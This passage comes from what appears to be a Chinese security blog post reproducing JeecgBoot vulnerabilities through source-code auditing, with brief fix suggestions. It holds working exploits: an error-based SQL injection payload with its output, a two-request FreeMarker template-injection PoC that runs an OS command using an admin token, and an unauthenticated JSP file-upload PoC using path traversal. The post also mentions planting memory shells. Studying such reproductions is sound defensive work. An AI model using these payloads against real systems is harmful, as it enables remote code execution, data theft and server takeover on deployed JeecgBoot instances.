charset=utf-8 {\u0026#34;apiSelectId\u0026#34;:\u0026#34;1316997232402231298\u0026#34;,\u0026#34;id\u0026#34;:\u0026#34;1\u0026#39; or \u0026#39;%1%\u0026#39; like (updatexml(0x3a,concat(1,(select md5(123456))),1)) or \u0026#39;%%\u0026#39; like \u0026#39;\u0026#34;} 回显： \u0026#34;操作失败，PreparedStatementCallback; uncategorized SQLException for SQL [select * from rep_demo_employee where id=\u0026#39;1\u0026#39; or \u0026#39;%1%\u0026#39; li…9ba59abbe56e057f20f883e\u0026#39;; nested exception is java.sql.SQLException: XPATH syntax error: \u0026#39;e10adc3949ba59abbe56e057f20f883e\u0026#39;\u0026#34; 很明显成功攻击了，后面慢慢打就行了。\n修复建议 及时更新黑名单的过滤，避免被攻击，以及对恶意符号的过滤，比如\u0026rsquo;和\u0026quot;等等。缺少过滤易被攻击拿到数据库。\ngetDictItemsByTable接口 1 2 3 4 5 // @RequestMapping(value = \u0026#34;/getDictItemsByTable/{table}/{key}/{value}\u0026#34;, method = RequestMethod.GET) // public Object getDictItemsByTable(@PathVariable String table,@PathVariable String key,@PathVariable String value) { // return this.ngAlainService.getDictByTable(table,key,value); // } //} 很明显啊，又给她注释掉了，我们来看看是什么毛病。简单审计一下就可以知道，这里是没有任何过滤的拼接查询。没有权限的判断，任何用户都可以直接进行访问。从而进行利用。可以查询到很多东西。但是很明显这里已经去掉了，就不尝试攻击这个了。\n修复建议 对只需设置参数的查询做好预编译以及参数的过滤等等。尽可能避免被SQL注入攻击到。\nSSTI漏洞 Java里面的SSTI漏洞，学习！\nloadTableData方法 找了一万年，艹了。直接看下面的代码吧。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 public Map\u0026lt;String, Object\u0026gt; loadTableData(String dbKey, String tableName, Integer pageNo, Integer pageSize, String sql, String paramArray) { HashMap var7 = new HashMap(5); String var8 = this.jimuTokenClient.getToken(); Map var9 = null; if (g.d(var8)) { var9 = this.jimuTokenClient.getUserInfo(var8); } if (g.d(paramArray)) { sql = e.a(sql, var9, JSONArray.parseArray(paramArray)); } else { sql = e.a(sql, var9, (JSONArray)null); } a.debug(\u0026#34;报表查询querySql=\u0026gt;\\r\\n\u0026#34; + sql); String var10 = e.e(sql); if (g.d(var10)) { List var11 = this.jmreportDynamicDbUtil.a(dbKey, var10); var7.put(\u0026#34;records\u0026#34;, e.b(var11)); } else if (this.jmreportNoSqlUtil.b(dbKey)) { List var15 = this.jmreportNoSqlUtil.a(sql, dbKey); var7.put(\u0026#34;records\u0026#34;, e.b(var15)); } else if (g.d(dbKey)) { a var16 = org.jeecg.modules.jmreport.dyndb.a.a(dbKey); String var12 = MiniDaoUtil.createPageSql(var16.getDbUrl(), sql, pageNo, pageSize); a.debug(\u0026#34;报表查询pageSQL=\u0026gt;\\r\\n\u0026#34; + var12); List var13 = this.jmreportDynamicDbUtil.b(dbKey, var12, new Object[0]); var7.put(\u0026#34;records\u0026#34;, e.b(var13)); } else { MiniDaoPage var17 = this.reportDbDao.selectPageBySql(sql, pageNo, pageSize); var7.put(\u0026#34;total\u0026#34;, var17.getTotal()); var7.put(\u0026#34;records\u0026#34;, e.b(var17.getResults())); } return var7; } 这个方法，一眼看上去，有点像SQL查询啊，本来看看有没有SQL注入漏洞的，结果看到里面有一个渲染。\n1 2 3 sql = e.a(sql, var9, JSONArray.parseArray(paramArray)); 和 sql = e.a(sql, var9, (JSONArray)null); 这里有什么漏洞吗，我们就要去找这里的e类的a方法了。直接过去看看。找到文件夹下的e类，找找a方法。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 public static String a(String var0, Map\u0026lt;String, Object\u0026gt; var1, JSONArray var2) { if (var0 != null \u0026amp;\u0026amp; !\u0026#34;\u0026#34;.equals(var0)) { if (var0.endsWith(\u0026#34;;\u0026#34;)) { var0 = var0.substring(0, var0.length() - 1); } i.a(var0); var0 = b(var0, var1); var0 = a(var2, var0); var0 = a(var0, \u0026#34;\\\\$\u0026#34;); return var0; } else { throw new JimuReportException(\u0026#34;sql为空\u0026#34;); } } 可以看到啊，这里的代码只是一个中转，再往后面找，这里可以找到这里的另一个a方法。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 public static String a(JSONArray var0, String var1) { HashMap var2 = new HashMap(5); String var3 = \u0026#34;\\\\$\\\\{(\\\\S+)\\\\}\u0026#34;; Pattern var4 = Pattern.compile(var3); Matcher var5 = var4.matcher(var1); while(var5.find()) { String var6 = var5.group().replace(\u0026#34;${\u0026#34;, \u0026#34;\u0026#34;).replace(\u0026#34;}\u0026#34;, \u0026#34;\u0026#34;); var2.put(var6, var5.group()); } if (null != var0 \u0026amp;\u0026amp; var0.size() \u0026gt; 0) { for(int var13 = 0; var13 \u0026lt; var0.size(); ++var13) { JSONObject var7 = var0.getJSONObject(var13); Object var8 = var7.get(\u0026#34;paramName\u0026#34;); Object var9 = var7.get(\u0026#34;paramValue\u0026#34;); if (g.d(var8) \u0026amp;\u0026amp; g.d(var9)) { String var10 = ExpressUtil.a(String.valueOf(var9), (Map)null); var1 = var1.replace(\u0026#34;${\u0026#34; + var8 + \u0026#34;}\u0026#34;, var10); var1 = var1.replace(\u0026#34;\u0026#39;${\u0026#34; + var8 + \u0026#34;}\u0026#39;\u0026#34;, var10); } if (g.d(var8)) { if (g.d(var9)) { String var14 = ExpressUtil.a(String.valueOf(var9), (Map)null); var2.put(String.valueOf(var8), var14); } else { var2.put(String.valueOf(var8), \u0026#34;\u0026#34;); } } } } var1 = FreeMarkerUtils.a(var1, var2); return var1; } 最重要的一行代码：var1 = FreeMarkerUtils.a(var1, var2);，很明显的一个FreeMarker的模板解析了，后面的东西就不找了，找到最后肯定也就是一个模板解析。我们直接去打一下，看看有没有回显。 可以看到我们成功得到了whoami的回显，说明是可以利用的。之后这种能RCE的会打内存马，这里内存马还不是很熟悉，所以先放一下了。\nsendMsg接口 老规矩，直接去看一下代码。 我们是先通过import freemarker先找到了这样的一个文件。 我们这里直接看它的代码。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 public boolean sendMessage(String msgType, String templateCode, Map\u0026lt;String, String\u0026gt; map, String sentTo) { List\u0026lt;SysMessageTemplate\u0026gt; sysSmsTemplates = sysMessageTemplateService.selectByCode(templateCode); SysMessage sysMessage = new SysMessage(); if (sysSmsTemplates.size() \u0026gt; 0) { SysMessageTemplate sysSmsTemplate = sysSmsTemplates.get(0); sysMessage.setEsType(msgType); sysMessage.setEsReceiver(sentTo); //模板标题 String title = sysSmsTemplate.getTemplateName(); //模板内容 String content = sysSmsTemplate.getTemplateContent(); StringWriter stringWriter = new StringWriter(); Template template = null; try { template = new Template(\u0026#34;SysMessageTemplate\u0026#34;, content, freemarkerConfig); template.process(map, stringWriter); } catch (IOException e) { e.printStackTrace(); return false; } catch (TemplateException e) { e.printStackTrace(); return false; } content = stringWriter.toString(); sysMessage.setEsTitle(title); sysMessage.setEsContent(content); sysMessage.setEsParam(JSONObject.toJSONString(map)); sysMessage.setEsSendTime(new Date()); sysMessage.setEsSendStatus(SendMsgStatusEnum.WAIT.getCode()); sysMessage.setEsSendNum(0); if(sysMessageService.save(sysMessage)) { return true; } } return false; } 还是很明显可以看得出来的，这里我们可以设计一个而已的freemarker的模板放上去，如果后面有调用的话就会触发执行。然后我们跟调用，找到对应的接口。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 @PostMapping(value = \u0026#34;/sendMsg\u0026#34;) public Result\u0026lt;SysMessageTemplate\u0026gt; sendMessage(@RequestBody MsgParams msgParams) { Result\u0026lt;SysMessageTemplate\u0026gt; result = new Result\u0026lt;SysMessageTemplate\u0026gt;(); try { MessageDTO md = new MessageDTO(); md.setToAll(false); md.setTitle(\u0026#34;消息发送测试\u0026#34;); md.setTemplateCode(msgParams.getTemplateCode()); md.setToUser(msgParams.getReceiver()); md.setType(msgParams.getMsgType()); String testData = msgParams.getTestData(); if(oConvertUtils.isNotEmpty(testData)){ Map\u0026lt;String, Object\u0026gt; data = JSON.parseObject(testData, Map.class); md.setData(data); } sysBaseApi.sendTemplateMessage(md); return result.success(\u0026#34;消息发送成功！\u0026#34;); } catch (Exception e) { log.error(\u0026#34;发送消息出错\u0026#34;, e.getMessage()); return result.error500(\u0026#34;发送消息出错！\u0026#34;); } } 如何就可以找到这个里面调用了这个方法，可以直接进行利用，但是我们现在要编辑一下数据库中的东西，毕竟前面的那个context是从数据库中获取的，找一下编辑的地方。 找到这里，基本就可以确定路由了，这边我们先找可以编辑的地方。 登录管理员账号进入这个界面，就可以新建模板了，还是比较好理解的，这里直接给出poc出来。\n1 2 3 4 5 6 7 8 POST /jeecg-boot/sys/message/sysMessageTemplate/add X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NjcxMDYyNDgsInVzZXJuYW1lIjoiYWRtaW4ifQ.RnH0QRNdTDoE3owB2q6IN92xfGbHcRKo2yGck5CdvOY {\u0026#34;templateName\u0026#34;:\u0026#34;demo5\u0026#34;,\u0026#34;templateCode\u0026#34;:\u0026#34;demo5\u0026#34;,\u0026#34;templateType\u0026#34;:\u0026#34;2\u0026#34;,\u0026#34;templateContent\u0026#34;:\u0026#34;\u0026lt;#assign value=\\\u0026#34;freemarker.template.utility.Execute\\\u0026#34;?new()\u0026gt;${value(\\\u0026#34;calc\\\u0026#34;)}\u0026#34;, \u0026#34;templateTestJson\u0026#34;:\u0026#34; \u0026#34;} POST /jeecg-boot/sys/message/sysMessageTemplate/sendMsg X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NjcxMDYyNDgsInVzZXJuYW1lIjoiYWRtaW4ifQ.RnH0QRNdTDoE3owB2q6IN92xfGbHcRKo2yGck5CdvOY {\u0026#34;templateCode\u0026#34;:\u0026#34;demo5\u0026#34;,\u0026#34;templateName\u0026#34;:\u0026#34;demo5\u0026#34;,\u0026#34;templateContent\u0026#34;:\u0026#34;\u0026lt;#assign value=\\\u0026#34;freemarker.template.utility.Execute\\\u0026#34;?new()\u0026gt;${value(\\\u0026#34;calc\\\u0026#34;)}\u0026#34;,\u0026#34;testData\u0026#34;:\u0026#34;{\\\u0026#34;louis\\\u0026#34;:\\\u0026#34;louis\\\u0026#34;}\u0026#34;,\u0026#34;msgType\u0026#34;:\u0026#34;2\u0026#34;,\u0026#34;receiver\u0026#34;:\u0026#34;admin\u0026#34;} 直接打进去就可以了，记得改Token。\n文件上传漏洞 在代码当中还找到了一个未授权的文件上传点，这个不需要授权就可以上传，但是访问的话需要Token，所以我们还是需要登录的。\nupload接口 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 @ResponseBody @PostMapping(\u0026#34;/upload\u0026#34;) //@RequiresRoles(\u0026#34;admin\u0026#34;) public Result upload(@RequestParam(\u0026#34;file\u0026#34;) MultipartFile multipartFile) { Result result = new Result(); try { ossFileService.upload(multipartFile); result.success(\u0026#34;上传成功！\u0026#34;); } catch (Exception ex) { log.info(ex.getMessage(), ex); result.error500(\u0026#34;上传失败\u0026#34;); } return result; } 其实看出来还是很明显的，这个被注释掉应该是后面加的@RequiresRoles(\u0026quot;admin\u0026quot;)，很多前面的东西都需要加这个东西，可能是为了使用方便不，先不管那么多了，这里很明显啊，就是一个直接的上传，啥东西都没过滤，往里面看看。 里面也没什么东西了，好像是又修掉了，正常这里应该是漏洞点了。多的就先不管了。\ncommonController.do 这里也有个越权的文件上传，虽然越权不是他的问题，但是这里也是可以利用的。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 @PostMapping(value = \u0026#34;/upload\u0026#34;) public Result\u0026lt;?\u0026gt; upload(HttpServletRequest request, HttpServletResponse response) { Result\u0026lt;?\u0026gt; result = new Result\u0026lt;\u0026gt;(); String savePath = \u0026#34;\u0026#34;; String bizPath = request.getParameter(\u0026#34;biz\u0026#34;); //LOWCOD-2580 sys/common/upload接口存在任意文件上传漏洞 if (oConvertUtils.isNotEmpty(bizPath)) { if(bizPath.contains(SymbolConstant.SPOT_SINGLE_SLASH) || bizPath.contains(SymbolConstant.SPOT_DOUBLE_BACKSLASH)){ throw new JeecgBootException(\u0026#34;上传目录bizPath，格式非法！\u0026#34;); } } MultipartHttpServletRequest multipartRequest = (MultipartHttpServletRequest) request; // 获取上传文件对象 MultipartFile file = multipartRequest.getFile(\u0026#34;file\u0026#34;); if(oConvertUtils.isEmpty(bizPath)){ if(CommonConstant.UPLOAD_TYPE_OSS.equals(uploadType)){ //未指定目录，则用阿里云默认目录 upload bizPath = \u0026#34;upload\u0026#34;; //result.setMessage(\u0026#34;使用阿里云文件上传时，必须添加目录！\u0026#34;); //result.setSuccess(false); //return result; }else{ bizPath = \u0026#34;\u0026#34;; } } if(CommonConstant.UPLOAD_TYPE_LOCAL.equals(uploadType)){ //update-begin-author:lvdandan date:20200928 for:修改JEditor编辑器本地上传 savePath = this.uploadLocal(file,bizPath); //update-begin-author:lvdandan date:20200928 for:修改JEditor编辑器本地上传 /** 富文本编辑器及markdown本地上传时，采用返回链接方式 //针对jeditor编辑器如何使 lcaol模式，采用 base64格式存储 String jeditor = request.getParameter(\u0026#34;jeditor\u0026#34;); if(oConvertUtils.isNotEmpty(jeditor)){ result.setMessage(CommonConstant.UPLOAD_TYPE_LOCAL); result.setSuccess(true); return result; }else{ savePath = this.uploadLocal(file,bizPath); } */ }else{ //update-begin-author:taoyan date:20200814 for:文件上传改造 savePath = CommonUtils.upload(file, bizPath, uploadType); //update-end-author:taoyan date:20200814 for:文件上传改造 } if(oConvertUtils.isNotEmpty(savePath)){ result.setMessage(savePath); result.setSuccess(true); }else { result.setMessage(\u0026#34;上传失败！\u0026#34;); result.setSuccess(false); } return result; } 这里非常简单的验证了一下路径，但是什么用都没有起到，结合/api的路径穿越漏洞，直接就能访问到这个接口。/jeecg-boot/api/../commonController.do?parserXml，然后就可以看到后面的文件上传功能，可以发现，什么文件都可以上传，随便就可以打进去，不管是jsp还是什么别的东西。 给个poc吧：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 POST /jeecg-boot/api/../commonController.do?parserXml HTTP/1.1 Host: Accept-Encoding: gzip, deflate Content-Length: 360 User-Agent: Mozilla/2.0 (compatible; MSIE 3.01; Windows 95 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygcflwtei Connection: close ------WebKitFormBoundarygcflwtei Content-Disposition: form-data; \u0026#34;name=\u0026#34;name\u0026#34; zW9YCa.png ------WebKitFormBoundarygcflwtei ontent-Disposition: form-data; name=\u0026#34;documentTitle\u0026#34; blank ------WebKitFormBoundarygcflwtei Content-Disposition: form-data; name=\u0026#34;file\u0026#34;; filename=\u0026#34;zW9YCa.jsp\u0026#34; Content-Type: image/png 11111 ------WebKitFormBoundarygcflwtei-- ","date":"2025-12-30T00:00:00Z","image":"https://xxxxctfer.github.io/images/JeecgBoot/1.png","permalink":"https://xxxxctfer.github.io/p/jeecgboot%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","title":"JeecgBoot漏洞复现"}]